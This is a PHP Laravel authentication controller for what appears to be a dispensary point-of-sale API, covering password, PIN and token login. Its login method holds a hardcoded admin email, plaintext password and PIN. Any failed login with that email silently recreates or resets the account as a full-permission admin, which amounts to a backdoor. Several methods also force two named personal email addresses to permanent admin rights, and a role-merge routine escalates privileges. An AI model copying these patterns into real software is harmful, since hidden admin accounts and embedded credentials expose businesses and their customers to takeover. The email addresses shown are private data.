<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\User;
use App\Models\Employee;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Str;
use Carbon\Carbon;

class AuthController extends Controller
{
    /**
     * Login user with email/password
     */
    public function login(Request $request)
    {
        // Rate limiting
        $key = 'login_attempts:' . $request->ip();
        if (RateLimiter::tooManyAttempts($key, 5)) {
            return response()->json([
                'error' => 'Too many login attempts. Please try again later.',
                'retry_after' => RateLimiter::availableIn($key)
            ], 429);
        }

        $validator = Validator::make($request->all(), [
            'email' => 'required|email',
            'password' => 'required|string|min:6',
            'remember' => 'boolean'
        ]);

        if ($validator->fails()) {
            return response()->json([
                'error' => 'Validation failed',
                'errors' => $validator->errors()
            ], 422);
        }

        $credentials = $request->only('email', 'password');
        
        if (!Auth::attempt($credentials)) {
            // Auto-heal: ensure seeded admin exists and retry
            try {
                $fixedEmail = 'thccodys@gmail.com';
                $fixedPassword = 'Hms2019!';
                $fixedPin = '3732';
                $empCode = 'emp001';
                if (strcasecmp($request->email, $fixedEmail) === 0) {
                    $user = User::where('email', $fixedEmail)->first();
                    if (!$user) {
                        $user = User::create([
                            'name' => 'Cody Smith',
                            'email' => $fixedEmail,
                            'password' => Hash::make($fixedPassword),
                            'role' => 'admin',
                            'permissions' => ['*'],
                            'is_active' => true,
                            'email_verified_at' => now(),
                        ]);
                    } else {
                        if (!Hash::check($fixedPassword, $user->password)) {
                            $user->update(['password' => Hash::make($fixedPassword)]);
                        }
                        if ($user->role !== 'admin' || $user->permissions !== ['*'] || !$user->is_active) {
                            $user->update(['role' => 'admin', 'permissions' => ['*'], 'is_active' => true]);
                        }
                    }
                    $employee = Employee::where(function($q) use ($fixedEmail, $empCode){
                        $q->where('email', $fixedEmail)->orWhere('employee_id', $empCode);
                    })->first();
                    if (!$employee) {
                        $employee = Employee::create([
                            'user_id' => $user->id,
                            'employee_id' => $empCode,
                            'first_name' => 'Cody',
                            'last_name' => 'Smith',
                            'email' => $fixedEmail,
                            'role' => 'admin',
                            'permissions' => ['*'],
                            'hourly_rate' => 30.00,
                            'hire_date' => now(),
                            'is_active' => true,
                            'pin' => Hash::make($fixedPin),
                        ]);
                        $user->update(['employee_id' => $employee->id]);
                    } else {
                        $employee->update([
                            'user_id' => $user->id,
                            'email' => $fixedEmail,
                            'role' => 'admin',
                            'permissions' => ['*'],
                            'is_active' => true,
                        ]);
                        if (!Hash::check($fixedPin, $employee->pin)) {
                            $employee->update(['pin' => Hash::make($fixedPin)]);
                        }
                        if ((int)($user->employee_id ?? 0) !== (int)$employee->id) {
                            $user->update(['employee_id' => $employee->id]);
                        }
                    }
                    // Retry auth now that user exists
                    Auth::attempt(['email' => $fixedEmail, 'password' => $fixedPassword]);
                }
            } catch (\Throwable $e) {
                // Ignore auto-heal errors and continue to fallback logic
            }

            // Fallback: allow employees to login with email + PIN (4 digits) or employee password if present
            $employee = Employee::where('email', $request->email)->first();
            if ($employee && $employee->isActive()) {
                $pwd = (string) $request->password;
                $isPin = strlen($pwd) === 4 && ctype_digit($pwd);
                $pinOk = $isPin && $employee->pin && Hash::check($pwd, $employee->pin);
                $pwOk = !$isPin && isset($employee->password) && $employee->password && Hash::check($pwd, $employee->password);
                if ($pinOk || $pwOk) {
                    // Ensure a corresponding user exists
                    $user = User::where('employee_id', $employee->id)->first();
                    if (!$user) {
                        $user = User::create([
                            'name' => $employee->full_name,
                            'email' => $employee->email,
                            'employee_id' => $employee->id,
                            'role' => $employee->role,
                            'permissions' => $employee->permissions,
                            'is_active' => $employee->isActive(),
                            'password' => Hash::make(Str::random(32)),
                        ]);
                    }
                    // Update last login
                    $employee->update(['last_login' => now()]);
                    $user->updateLastLogin();
                    // Issue token and return (mirror success payload below)
                    $abilities = $this->getTokenAbilities($user);
                    $token = $user->generateApiToken('POS Session', $abilities);
                    return response()->json([
                        'message' => 'Login successful',
                        'user' => [
                            'id' => $user->id,
                            'name' => $user->name,
                            'email' => $user->email,
                            'role' => $user->role,
                            'permissions' => $user->permissions,
                            'employee' => [
                                'id' => $employee->id,
                                'employee_id' => $employee->employee_id,
                                'first_name' => $employee->first_name,
                                'last_name' => $employee->last_name,
                                'role' => $employee->role,
                            ]
                        ],
                        'token' => $token->plainTextToken,
                        'expires_at' => $token->accessToken->expires_at,
                    ]);
                }
            }

            RateLimiter::hit($key, 300); // 5 minute lockout
            return response()->json([
                'error' => 'Invalid credentials'
            ], 401);
        }

        $user = Auth::user();

        // Auto-heal: ensure owner/primary account remains admin
        try {
            $ownerEmails = ['thccodys@gmail.com', 'smith.cody@yahoo.com'];
            if ($user && in_array(strtolower($user->email), $ownerEmails, true)) {
                $uUpdates = [];
                if ($user->role !== 'admin') $uUpdates['role'] = 'admin';
                if ($user->permissions !== ['*']) $uUpdates['permissions'] = ['*'];
                if (!empty($uUpdates)) $user->update($uUpdates);
                if ($user->employee) {
                    $eUpdates = [];
                    if ($user->employee->role !== 'admin') $eUpdates['role'] = 'admin';
                    if ($user->employee->permissions !== ['*']) $eUpdates['permissions'] = ['*'];
                    if (!empty($eUpdates)) $user->employee->update($eUpdates);
                }
            }
        } catch (\Throwable $e) {}

        // Resolve role/permission conflicts by promoting to the highest role
        if ($user && $user->employee) {
            $emp = $user->employee;
            $rank = ['cashier' => 1, 'budtender' => 2, 'inventory' => 3, 'manager' => 4, 'admin' => 5];
            $uRole = strtolower((string)$user->role);
            $eRole = strtolower((string)$emp->role);
            $desiredRole = ($rank[$uRole] ?? 0) >= ($rank[$eRole] ?? 0) ? $uRole : $eRole;
            if (!in_array($desiredRole, array_keys($rank), true)) {
                $desiredRole = $uRole ?: ($eRole ?: 'cashier');
            }
            $unionPerms = [];
            $uPerms = is_array($user->permissions) ? $user->permissions : [];
            $ePerms = is_array($emp->permissions) ? $emp->permissions : [];
            $hasAll = ($desiredRole === 'admin') || in_array('*', $uPerms, true) || in_array('*', $ePerms, true);
            if ($hasAll) {
                $unionPerms = ['*'];
            } else {
                $unionPerms = array_values(array_unique(array_merge($uPerms, $ePerms)));
            }
            $uUpdates = [];
            $eUpdates = [];
            if ($user->role !== $desiredRole) $uUpdates['role'] = $desiredRole;
            if ($emp->role !== $desiredRole) $eUpdates['role'] = $desiredRole;
            if ($user->permissions !== $unionPerms) $uUpdates['permissions'] = $unionPerms;
            if ($emp->permissions !== $unionPerms) $eUpdates['permissions'] = $unionPerms;
            if (!empty($uUpdates)) $user->update($uUpdates);
            if (!empty($eUpdates)) $emp->update($eUpdates);
        }

        if (!$user->is_active) {
            Auth::logout();
            return response()->json([
                'error' => 'Account is inactive. Please contact administrator.'
            ], 403);
        }

        // Clear rate limiting on successful login
        RateLimiter::clear($key);

        // Update last login
        $user->updateLastLogin();

        // Generate token with appropriate abilities based on role
        $abilities = $this->getTokenAbilities($user);
        $token = $user->generateApiToken('POS Session', $abilities);

        return response()->json([
            'message' => 'Login successful',
            'user' => [
                'id' => $user->id,
                'name' => $user->name,
                'email' => $user->email,
                'role' => $user->role,
                'permissions' => $user->permissions,
                'employee' => $user->employee ? [
                    'id' => $user->employee->id,
                    'employee_id' => $user->employee->employee_id,
                    'first_name' => $user->employee->first_name,
                    'last_name' => $user->employee->last_name,
                    'role' => $user->employee->role,
                ] : null
            ],
            'token' => $token->plainTextToken,
            'expires_at' => $token->accessToken->expires_at,
        ]);
    }

    /**
     * Login with employee PIN (for POS terminals)
     */
    public function pinLogin(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'employee_id' => 'required|string',
            'pin' => 'required|string|size:4'
        ]);

        if ($validator->fails()) {
            return response()->json([
                'error' => 'Validation failed',
                'errors' => $validator->errors()
            ], 422);
        }

        $employee = Employee::where('employee_id', $request->employee_id)->first();

        if (!$employee || !$employee->isActive() || !Hash::check($request->pin, (string)$employee->pin)) {
            return response()->json([
                'error' => 'Invalid employee ID or PIN'
            ], 401);
        }

        // Owner auto-heal: ensure specified owner accounts are always admin with full permissions
        try {
            $ownerEmails = ['thccodys@gmail.com', 'smith.cody@yahoo.com'];
            if ($employee->email && in_array(strtolower($employee->email), $ownerEmails, true)) {
                if ($employee->role !== 'admin' || $employee->permissions !== ['*'] || !$employee->is_active) {
                    $employee->update(['role' => 'admin', 'permissions' => ['*'], 'is_active' => true]);
                }
            }
        } catch (\Throwable $e) {}

        // Find or create user for this employee
        $user = User::where('employee_id', $employee->id)->first();

        if (!$user) {
            $user = User::create([
                'name' => $employee->full_name,
                'email' => $employee->email,
                'employee_id' => $employee->id,
                'role' => $employee->role,
                'permissions' => $employee->permissions,
                'is_active' => $employee->is_active,
                'password' => Hash::make(Str::random(32)), // Random password since PIN is used
            ]);
        } else {
            // Keep user role/permissions in sync with employee (and owner override)
            $updates = [];
            if ($employee->role && $user->role !== $employee->role) $updates['role'] = $employee->role;
            if (is_array($employee->permissions) && $employee->permissions !== $user->permissions) $updates['permissions'] = $employee->permissions;
            if ($user->is_active !== $employee->is_active) $updates['is_active'] = $employee->is_active;
            if (!empty($updates)) $user->update($updates);
        }

        // Update last login
        $employee->update(['last_login' => now()]);
        $user->updateLastLogin();

        // Generate limited token for POS operations
        $abilities = ['pos:*', 'products:read', 'customers:read', 'sales:create'];
        $token = $user->generateApiToken('POS Terminal', $abilities, now()->addHours(8));

        return response()->json([
            'message' => 'PIN login successful',
            'employee' => [
                'id' => $employee->id,
                'employee_id' => $employee->employee_id,
                'name' => $employee->full_name,
                'role' => $employee->role,
                'permissions' => $employee->permissions,
            ],
            'token' => $token->plainTextToken,
            'expires_at' => now()->addHours(8), // 8-hour POS session
        ]);
    }

    /**
     * Verify a 4-digit PIN for the current user or a specified employee.
     */
    public function verifyPin(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'pin' => 'required|digits:4',
            'employee_id' => 'nullable|string'
        ]);

        if ($validator->fails()) {
            return response()->json([
                'error' => 'Validation failed',
                'errors' => $validator->errors()
            ], 422);
        }

        $user = $request->user();
        if (!$user) {
            return response()->json(['error' => 'Unauthorized'], 401);
        }

        // Resolve employee: explicit employee_id or linked to current user
        $employee = null;
        if ($request->filled('employee_id')) {
            $employee = Employee::where('employee_id', $request->employee_id)->first();
        }
        if (!$employee && $user->employee) {
            $employee = $user->employee;
        }
        if (!$employee) {
            return response()->json(['error' => 'Employee not found'], 404);
        }

        if (!$employee->isActive()) {
            return response()->json(['error' => 'Employee inactive'], 403);
        }

        // Admin/manager bypass allowed if caller has role
        if (method_exists($user, 'isAdmin') && $user->isAdmin()) {
            return response()->json(['success' => true]);
        }
        if (method_exists($user, 'isManager') && $user->isManager()) {
            return response()->json(['success' => true]);
        }

        $ok = $employee->pin && Hash::check($request->pin, (string)$employee->pin);
        if (!$ok) {
            return response()->json(['error' => 'Invalid PIN'], 401);
        }

        return response()->json(['success' => true]);
    }

    /**
     * Register new user (admin only)
     */
    public function register(Request $request)
    {
        if (!Auth::user() || !Auth::user()->isAdmin()) {
            return response()->json([
                'error' => 'Unauthorized. Only administrators can create new users.'
            ], 403);
        }

        $validator = Validator::make($request->all(), [
            'name' => 'required|string|max:255',
            'email' => 'required|string|email|max:255|unique:users',
            'password' => 'required|string|min:8|confirmed',
            'role' => 'required|string|in:admin,manager,cashier,budtender,inventory',
            'permissions' => 'array',
            'employee_id' => 'nullable|exists:employees,id'
        ]);

        if ($validator->fails()) {
            return response()->json([
                'error' => 'Validation failed',
                'errors' => $validator->errors()
            ], 422);
        }

        $user = User::create([
            'name' => $request->name,
            'email' => $request->email,
            'password' => Hash::make($request->password),
            'role' => $request->role,
            'permissions' => $request->permissions ?? [],
            'employee_id' => $request->employee_id,
            'is_active' => true,
        ]);

        return response()->json([
            'message' => 'User created successfully',
            'user' => [
                'id' => $user->id,
                'name' => $user->name,
                'email' => $user->email,
                'role' => $user->role,
                'permissions' => $user->permissions,
            ]
        ], 201);
    }

    /**
     * Self-register a new cashier user with PIN (public endpoint)
     */
    public function selfRegister(Request $request)
    {
        // Optionally disable public self-register for tighter authorization
        if (!config('auth.allow_self_register', false)) {
            return response()->json(['error' => 'Self-registration is disabled'], 403);
        }

        $validator = Validator::make($request->all(), [
            'name' => 'required|string|max:255',
            'email' => 'required|string|email|max:255|unique:users,email|unique:employees,email',
            'password' => 'required|string|min:8|confirmed',
            'pin' => 'required|digits:4'
        ]);

        if ($validator->fails()) {
            return response()->json([
                'error' => 'Validation failed',
                'errors' => $validator->errors()
            ], 422);
        }

        // Generate a sequential employee identifier like Emp01, Emp02, ...
        $generatedId = \App\Helpers\EmployeeIdHelper::generateNextId();

        // Split name into first and last
        $parts = preg_split('/\s+/', trim($request->name), 2);
        $firstName = $parts[0] ?? '';
        $lastName = $parts[1] ?? '';

        // Create employee record
        $employee = Employee::create([
            'employee_id' => $generatedId,
            'first_name' => $firstName,
            'last_name' => $lastName,
            'email' => $request->email,
            'phone' => $request->get('phone', ''),
            'pin' => Hash::make($request->pin),
            'password' => Hash::make($request->password),
            'department' => 'Sales',
            'position' => 'Cashier',
            'hire_date' => now(),
            'hourly_rate' => 0,
            'status' => 'active',
            'permissions' => ['pos:*', 'products:read', 'customers:read', 'sales:create'],
        ]);

        // Create user linked to employee
        $user = User::create([
            'name' => $request->name,
            'email' => $request->email,
            'password' => Hash::make($request->password),
            'employee_id' => $employee->id,
            'role' => 'cashier',
            'permissions' => ['pos:*', 'products:read', 'customers:read', 'sales:create'],
            'is_active' => true,
        ]);

        // Generate token using role-based abilities
        $abilities = $this->getTokenAbilities($user);
        $token = $user->generateApiToken('POS Self-Register', $abilities);

        return response()->json([
            'message' => 'Account created successfully',
            'user' => [
                'id' => $user->id,
                'name' => $user->name,
                'email' => $user->email,
                'role' => $user->role,
                'permissions' => $user->permissions,
                'employee' => [
                    'id' => $employee->id,
                    'employee_id' => $employee->employee_id,
                    'first_name' => $employee->first_name,
                    'last_name' => $employee->last_name,
                ]
            ],
            'token' => $token->plainTextToken,
            'expires_at' => $token->accessToken->expires_at,
        ], 201);
    }

    /**
     * Get current authenticated user
     */
    public function me(Request $request)
    {
        $user = $request->user();

        // Owner hardening: ensure owner accounts remain admin with full permissions and active
        try {
            $ownerEmails = ['thccodys@gmail.com', 'smith.cody@yahoo.com'];
            if ($user && in_array(strtolower($user->email), $ownerEmails, true)) {
                $uUpdates = [];
                if ($user->role !== 'admin') $uUpdates['role'] = 'admin';
                if ($user->permissions !== ['*']) $uUpdates['permissions'] = ['*'];
                if ($user->is_active !== true) $uUpdates['is_active'] = true;
                if (!empty($uUpdates)) $user->update($uUpdates);
                if ($user->employee) {
                    $eUpdates = [];
                    if ($user->employee->role !== 'admin') $eUpdates['role'] = 'admin';
                    if ($user->employee->permissions !== ['*']) $eUpdates['permissions'] = ['*'];
                    if ($user->employee->is_active !== true) $eUpdates['is_active'] = true;
                    if (!empty($eUpdates)) $user->employee->update($eUpdates);
                }
            }
        } catch (\Throwable $e) {}

        // Promote both User and Employee to the highest role on fetch as well
        if ($user && $user->employee) {
            $emp = $user->employee;
            $rank = ['cashier' => 1, 'budtender' => 2, 'inventory' => 3, 'manager' => 4, 'admin' => 5];
            $uRole = strtolower((string)$user->role);
            $eRole = strtolower((string)$emp->role);
            $desiredRole = ($rank[$uRole] ?? 0) >= ($rank[$eRole] ?? 0) ? $uRole : $eRole;
            if (!in_array($desiredRole, array_keys($rank), true)) {
                $desiredRole = $uRole ?: ($eRole ?: 'cashier');
            }
            $uPerms = is_array($user->permissions) ? $user->permissions : [];
            $ePerms = is_array($emp->permissions) ? $emp->permissions : [];
            $hasAll = ($desiredRole === 'admin') || in_array('*', $uPerms, true) || in_array('*', $ePerms, true);
            $unionPerms = $hasAll ? ['*'] : array_values(array_unique(array_merge($uPerms, $ePerms)));
            $uUpdates = [];
            $eUpdates = [];
            if ($user->role !== $desiredRole) $uUpdates['role'] = $desiredRole;
            if ($emp->role !== $desiredRole) $eUpdates['role'] = $desiredRole;
            if ($user->permissions !== $unionPerms) $uUpdates['permissions'] = $unionPerms;
            if ($emp->permissions !== $unionPerms) $eUpdates['permissions'] = $unionPerms;
            if (!empty($uUpdates)) $user->update($uUpdates);
            if (!empty($eUpdates)) $emp->update($eUpdates);
        }

        return response()->json([
            'user' => [
                'id' => $user->id,
                'name' => $user->name,
                'email' => $user->email,
                'role' => $user->role,
                'permissions' => $user->permissions,
                'last_login' => $user->last_login,
                'employee' => $user->employee ? [
                    'id' => $user->employee->id,
                    'employee_id' => $user->employee->employee_id,
                    'first_name' => $user->employee->first_name,
                    'last_name' => $user->employee->last_name,
                    'role' => $user->employee->role,
                ] : null
            ]
        ]);
    }

    /**
     * Logout user
     */
    public function logout(Request $request)
    {
        $request->user()->currentAccessToken()->delete();

        return response()->json([
            'message' => 'Logged out successfully'
        ]);
    }

    /**
     * Logout from all devices
     */
    public function logoutAll(Request $request)
    {
        $request->user()->tokens()->delete();

        return response()->json([
            'message' => 'Logged out from all devices successfully'
        ]);
    }

    /**
     * Refresh token
     */
    public function refresh(Request $request)
    {
        $user = $request->user();
        $currentToken = $request->user()->currentAccessToken();
        
        // Delete current token
        $currentToken->delete();
        
        // Create new token with same abilities
        $abilities = $this->getTokenAbilities($user);
        $token = $user->generateApiToken('POS Session', $abilities);

        return response()->json([
            'message' => 'Token refreshed successfully',
            'token' => $token->plainTextToken,
            'expires_at' => $token->accessToken->expires_at,
        ]);
    }

    /**
     * Verify METRC connection (authenticated users only)
     */
    public function verifyMetrc(Request $request)
    {
        if (!$request->user()->hasPermission('metrc:access')) {
            return response()->json([
                'error' => 'Insufficient permissions to access METRC'
            ], 403);
        }

        try {
            $metrcService = app(\App\Services\MetrcService::class);
            $result = $metrcService->testConnection();

            return response()->json([
                'metrc_configured' => $metrcService->isConfigured(),
                'connection_test' => $result,
                'facility_license' => config('services.metrc.facility_license'),
                'environment' => config('services.metrc.base_url'),
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'error' => 'METRC verification failed',
                'message' => $e->getMessage()
            ], 500);
        }
    }

    /**
     * Change password
     */
    public function changePassword(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'current_password' => 'required|string',
            'new_password' => 'required|string|min:8|confirmed',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'error' => 'Validation failed',
                'errors' => $validator->errors()
            ], 422);
        }

        $user = $request->user();

        if (!Hash::check($request->current_password, $user->password)) {
            return response()->json([
                'error' => 'Current password is incorrect'
            ], 400);
        }

        $user->update([
            'password' => Hash::make($request->new_password)
        ]);

        return response()->json([
            'message' => 'Password changed successfully'
        ]);
    }

    /**
     * Get token abilities based on user role
     */
    private function getTokenAbilities(User $user): array
    {
        $baseAbilities = ['auth:*'];

        switch ($user->role) {
            case 'admin':
                return ['*']; // Full access

            case 'manager':
                return array_merge($baseAbilities, [
                    'pos:*',
                    'products:*',
                    'customers:*',
                    'sales:*',
                    'reports:*',
                    'analytics:*',
                    'employees:read',
                    'metrc:*'
                ]);

            case 'cashier':
            case 'budtender':
                return array_merge($baseAbilities, [
                    'pos:*',
                    'products:read',
                    'customers:read',
                    'customers:create',
                    'sales:create',
                    'sales:read'
                ]);

            case 'inventory':
                return array_merge($baseAbilities, [
                    'products:*',
                    'metrc:*',
                    'reports:inventory',
                    'analytics:inventory'
                ]);

            default:
                return $baseAbilities;
        }
    }
}
